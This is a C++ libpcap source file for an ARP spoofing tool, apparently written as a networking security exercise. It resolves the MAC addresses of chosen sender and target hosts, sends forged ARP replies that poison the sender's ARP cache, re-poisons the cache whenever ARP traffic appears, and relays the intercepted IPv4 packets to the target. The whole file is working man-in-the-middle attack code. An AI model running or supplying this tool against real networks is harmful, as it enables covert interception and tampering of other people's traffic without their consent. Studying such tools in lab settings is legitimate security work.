#include <cstdio>
#include <pcap.h>
#include "ethhdr.h"
#include "arphdr.h"
#include <sys/ioctl.h>
#include <net/if.h>
#include <unistd.h>
#include <stddef.h>
#include <stdint.h>
#include <map>
#include <iostream>

#pragma pack(push, 1)
struct EthArpPacket {
    EthHdr eth_;
    ArpHdr arp_;
};
#pragma pack(pop)

#pragma pack(push, 1)
struct SenderTargetInfo {
    Mac sender_mac_;
    Mac target_mac_;
    Ip  sender_ip_;
    Ip  target_ip_;
};
#pragma pack(pop)

void usage() {
    printf("syntax: send-arp-test <interface> <sender ip 1> <target ip 1> [<sender ip 2> <target ip 2>...]\n");
    printf("sample: send-arp-test eth0 172.30.1.3 172.30.1.254\n");
}

/* void    mac_to_str              (char *rtn, u_char *mac); */
Mac     *get_attacker_mac       (char *device);
Ip      *get_attacker_ip        (char *device);
Mac     *get_sender_mac         (char *device, Mac *attacker_mac, Ip *attacker_ip, Ip *sender_ip);
void    arp_spoof               (char *device, Mac *attacker_mac, SenderTargetInfo *sender_target_map, int array_len);
void    arp_infect              (pcap_t *handle, Mac *attacker_mac, SenderTargetInfo *sender_target_map);
void    relay_ipv4_packet       (pcap_t *handle, const u_char *packet, Mac *attacker_mac, Mac *target_mac);

int main(int argc, char* argv[]) {
    if (argc%2 != 0 && argc < 4) {
        usage();
        return -1;
    }

    char *device = argv[1];

    // get my mac
    Mac *attacker_mac = get_attacker_mac(device);
    if (attacker_mac == NULL) return -1;
    /* print mac address
    char test[18];
    mac_to_str(test, *attacker_mac);
    printf("%s\n", test);
    */

    // get my ip
    Ip *attacker_ip;
    attacker_ip = get_attacker_ip(device);
    if (attacker_ip == NULL) return -1;
    /* print ip address
    uint32_t iipp = ntohl(*attacker_ip);
    uint8_t test[4];
    for (int i=0; i<4 ;++i)
            test[i] = ((uint8_t*)&iipp)[3-i];
    for (int i=0; i<4 ;++i)
            printf("%d ",test[i]);
    printf("\n");
    */

    /**
     * Duplicate IP -> get mac address one time
     */

    // get pair information of sender and target
    int array_len = argc/2-1;
    SenderTargetInfo sender_target_map[array_len];
    for (int i = 1; i < array_len+1; i++) {
        printf("Get %dth sender target pair information\n", i);
        sender_target_map[i-1].sender_ip_ = Ip(argv[i*2]);
        sender_target_map[i-1].target_ip_ = Ip(argv[i*2+1]);
        sender_target_map[i-1].sender_mac_ = *get_sender_mac(device, attacker_mac, attacker_ip, &sender_target_map[i-1].sender_ip_);
        sender_target_map[i-1].target_mac_ = *get_sender_mac(device, attacker_mac, attacker_ip, &sender_target_map[i-1].target_ip_);
    }
    printf("\n");

    arp_spoof(device, attacker_mac, sender_target_map, array_len);
}

Mac *get_attacker_mac(char *device)
{
    // ------------------------------- googling..

    // ioctl 세번째 인자로 사용하는 구조체
    // 인터페이스 이름을 제외한 멤버 변수들은 union으로 구성 (메모리 공간 공유)
    struct ifreq ifr;
    unsigned char *mac_addr = NULL;

    memset(&ifr, 0x00, sizeof(ifr));
    strcpy(ifr.ifr_name, device);

    // Datagram socket
    int sock = socket(AF_UNIX, SOCK_DGRAM, 0);
    if (sock < 0) {
        fprintf(stderr, "socket error\n");
        return NULL;
    }

    // input output control
    // ipv4 (AF_INET)
    // SIOCGIFHWADDR - 0x8927 - Get Hardward Address
    if (ioctl(sock, SIOCGIFHWADDR, &ifr) < 0) {
        fprintf(stderr, "ioctl error\n");
        return NULL;
    }

    // allocate HW address pointer
    mac_addr = (unsigned char *) ifr.ifr_hwaddr.sa_data;

    // ------------------------------- end of googling code

    // write my mac address to buffer
    Mac *rtn = (Mac *) malloc(sizeof(Mac));
    *rtn = Mac(mac_addr);
    printf("--- Get My MAC Address ---\n");
    close(sock);

    return rtn;
}

Ip *get_attacker_ip(char *device){
    // ------------------------------- googling..

    // ioctl 세번째 인자로 사용하는 구조체
    // 인터페이스 이름을 제외한 멤버 변수들은 union으로 구성 (메모리 공간 공유)
    struct ifreq ifr;

    memset(&ifr, 0x00, sizeof(ifr));
    strcpy(ifr.ifr_name, device);

    // input output control
    // ipv4 (AF_INET)
    // Datagram socket
    int sock = socket(AF_INET, SOCK_DGRAM, 0);
    if (sock < 0) {
        fprintf(stderr, "socket error\n");
        return NULL;
    }

    // SIOCGIFADDR - 0x8915 - Get PA Address
    if (ioctl(sock, SIOCGIFADDR, &ifr) < 0) {
        fprintf(stderr, "ioctl error\n");
        return NULL;
    }
    // ------------------------------- end of googling code

    // input output control
    // AF_INET -> sockaddr_in
    // Get My IP (string format)
    struct sockaddr_in *sin;
    sin = (struct sockaddr_in*)&ifr.ifr_addr;
    // sin_addr : Host IP addrses
    Ip *rtn = (Ip *) malloc(sizeof(Ip));
    *rtn = Ip(ntohl(sin->sin_addr.s_addr));

    printf("--- Get My IP Address ---\n");

    close(sock);

    return rtn;
}

/*
void mac_to_str (char *rtn, u_char *mac) // convert 6 bytes mac address to string format for debugging
{
    snprintf(rtn, 18, "%02X:%02X:%02X:%02X:%02X:%02X",
             mac[0], mac[1], mac[2],
             mac[3], mac[4], mac[5]);
}
*/

Mac *get_sender_mac (char *device, Mac *attacker_mac, Ip *attacker_ip, Ip *sender_ip)
{
    // pcap open
    char errbuf[PCAP_ERRBUF_SIZE];
    pcap_t* handle = pcap_open_live(device, BUFSIZ, 1, 1, errbuf);
    if (handle == nullptr) {
        fprintf(stderr, "couldn't open device %s(%s)\n", device, errbuf);
        return NULL;
    }

    // send ARP Request
    EthArpPacket packet;

    packet.eth_.dmac_ = Mac("ff:ff:ff:ff:ff:ff");       // broadcast
    packet.eth_.smac_ = *attacker_mac;                  // my mac
    packet.eth_.type_ = htons(EthHdr::Arp);

    packet.arp_.hrd_ = htons(ArpHdr::ETHER);
    packet.arp_.pro_ = htons(EthHdr::Ip4);
    packet.arp_.hln_ = Mac::SIZE;
    packet.arp_.pln_ = Ip::SIZE;
    packet.arp_.op_ = htons(ArpHdr::Request);
    packet.arp_.smac_ = *attacker_mac;                  // my mac
    packet.arp_.sip_ = htonl(*attacker_ip);             // my ip
    packet.arp_.tmac_ = Mac("00:00:00:00:00:00");       // broadcast
    packet.arp_.tip_ = htonl(*sender_ip);               // sender ip

    int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
    if (res != 0) {
        fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
        return NULL;
    }

    // receive ARP Reply
    Mac *rtn = (Mac *) malloc(sizeof(Mac));
    while (true) {
        struct pcap_pkthdr *pcap_header;
        const u_char *packet;

        int res = pcap_next_ex(handle, &pcap_header, &packet);
        if (res == 0) continue;
        if (res == -1 || res == -2) {
            fprintf(stderr, "pcap_next_ex error (%d) %s\n", res, pcap_geterr(handle));
            return NULL;
        }

        struct EthArpPacket *eth_arp = (struct EthArpPacket *)packet;

        uint32_t s_ip = eth_arp->arp_.sip();

        if (eth_arp->eth_.type_ != htons(EthHdr::Arp)) continue;
        if (eth_arp->arp_.op_ != htons(ArpHdr::Reply)) continue;
        if (s_ip != *sender_ip) continue;

        printf("--- Catch Sender's MAC address ---\n");
        *rtn = Mac(eth_arp->arp_.smac_);

        break;
    }
    pcap_close(handle);
    return rtn;
}

void arp_spoof(char *device, Mac *attacker_mac, SenderTargetInfo *sender_target_map, int array_len)
{
    printf("start spoofing~~ \n");

    // pcap open
    char errbuf[PCAP_ERRBUF_SIZE];
    pcap_t* handle = pcap_open_live(device, BUFSIZ, 1, 1, errbuf);
    if (handle == nullptr) {
        fprintf(stderr, "couldn't open device %s(%s)\n", device, errbuf);
        return;
    }

    // initial infection!
    for (int i = 0; i < array_len; i++)
        arp_infect(handle, attacker_mac, &sender_target_map[i]);

    // receive packets
    while (true) {
        struct pcap_pkthdr *pcap_header;
        const u_char *packet;

        int res = pcap_next_ex(handle, &pcap_header, &packet);
        if (res == 0) continue;
        if (res == -1 || res == -2) {
            fprintf(stderr, "pcap_next_ex error (%d) %s\n", res, pcap_geterr(handle));
            return;
        }

        struct EthArpPacket *eth_arp = (struct EthArpPacket *)packet;

        /** ARP Protocol Request
         * sender ip -> target ip
         * reinfect each sender
         */
        // ARP Packet Receive
        if (eth_arp->eth_.type_ == htons(EthHdr::Arp)) {
            // sender reply
            for (int i = 0; i < array_len; i++) {
                if (sender_target_map[i].sender_mac_ == eth_arp->eth_.smac_)
                    arp_infect(handle, attacker_mac, &sender_target_map[i]);
            }
        }
        // IPv4 Packet Receive
        else if (eth_arp->eth_.type_ == htons(EthHdr::Ip4)) {
            // relay ip packet from sender to target

            // sender's ip packet
            for (int i = 0; i < array_len; i++) {
                if (sender_target_map[i].sender_mac_ == eth_arp->eth_.smac_) {
                    printf("\n%dth sender to target packet relay\n", i);
                    // relay packet
                    relay_ipv4_packet(handle, packet, attacker_mac, &sender_target_map[i].target_mac_);
                    break;
                }
            }
        }
        else continue;
    }

    pcap_close(handle);
    return;
}

void relay_ipv4_packet(pcap_t *handle, const u_char *packet, Mac *attacker_mac, Mac *target_mac)
{
    // spoofed ip packet length
    uint16_t packet_length;
    int total_length;
    memcpy(&packet_length, packet+14+2, sizeof(uint16_t));
    total_length = (int) ntohs(packet_length) + 14;

    // create relay ip packet
    u_char relay_ip_packet[total_length];
    memcpy(relay_ip_packet, packet, total_length);  /* copy spoofed ip packet to relay ip packet */
    memcpy(relay_ip_packet, target_mac, 6);         /* destination mac change to target's mac */
    memcpy(relay_ip_packet+6, attacker_mac, 6);     /* source mac change to attacker's mac */

    // send relay ip packet
    int res = pcap_sendpacket(handle, relay_ip_packet, total_length);
    if (res != 0) {
        fprintf(stderr, "ip relay return %d error=%s\n", res, pcap_geterr(handle));
    }

    return;
}

void arp_infect(pcap_t *handle, Mac *attacker_mac, SenderTargetInfo *sender_target_map)
{
    printf("call arp_infect\n");
    Mac smac = sender_target_map->sender_mac_;
    Ip  sip  = sender_target_map->sender_ip_;
    Ip  tip  = sender_target_map->target_ip_;
    EthArpPacket packet;

    packet.eth_.dmac_ = smac;           // sender
    packet.eth_.smac_ = *attacker_mac;  // attacker
    packet.eth_.type_ = htons(EthHdr::Arp);

    packet.arp_.hrd_  = htons(ArpHdr::ETHER);
    packet.arp_.pro_  = htons(EthHdr::Ip4);
    packet.arp_.hln_  = Mac::SIZE;
    packet.arp_.pln_  = Ip::SIZE;
    packet.arp_.op_   = htons(ArpHdr::Reply);
    packet.arp_.smac_ = *attacker_mac;  // attacker
    packet.arp_.sip_  = htonl(tip);     // target
    packet.arp_.tmac_ = smac;           // sender
    packet.arp_.tip_  = htonl(sip);     // sender

    int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
    if (res != 0) {
        fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
    }

    return;
}
